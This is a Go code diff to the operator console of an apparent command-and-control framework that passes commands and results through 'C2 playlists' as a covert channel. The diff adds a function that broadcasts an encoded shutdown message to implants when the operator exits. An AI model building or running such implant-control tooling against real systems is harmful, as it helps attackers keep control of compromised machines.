@@ -230,7 +230,10 @@ func (op *Operator) Interactive() {
 	// Start background poller for automatic checkin/result notifications
 	stopCh := make(chan struct{})
 	go op.startBackgroundPoller(stopCh)
-	defer func() { close(stopCh) }()
+	defer func() {
+		close(stopCh)
+		op.sendShutdown()
+	}()
 
 	scanner := bufio.NewScanner(os.Stdin)
 
@@ -580,6 +583,31 @@ func (op *Operator) cleanAll() {
 	_ = op.client.CleanC2Playlists(ctx, protocol.ChannelCmd, op.key, -1)
 	_ = op.client.CleanC2Playlists(ctx, protocol.ChannelRes, op.key, -1)
 	fmt.Println("[*] All C2 playlists cleaned")
+}
+
+// sendShutdown broadcasts a shutdown message so implants know
+// the operator has exited and a new session is required.
+func (op *Operator) sendShutdown() {
+	ctx := context.Background()
+	msg := protocol.NewC2Message("shutdown", -1)
+	msg.Data = "operator exited"
+	if op.attachedClient != "" {
+		if info, ok := op.connectedClients[op.attachedClient]; ok {
+			msg.SessionID = info.SessionID
+		}
+	}
+
+	encoded, err := protocol.EncodeMessage(msg.ToCommandMap(), op.key)
+	if err != nil {
+		return
+	}
+	chunks, err := protocol.ChunkPayload(encoded, -1,
+		protocol.ChannelCmd, op.key)
+	if err != nil {
+		return
+	}
+	_ = op.client.WriteC2Playlists(ctx, chunks)
+	fmt.Println("[*] Shutdown signal sent to implants")
 }
 
 func (op *Operator) printStatus() {
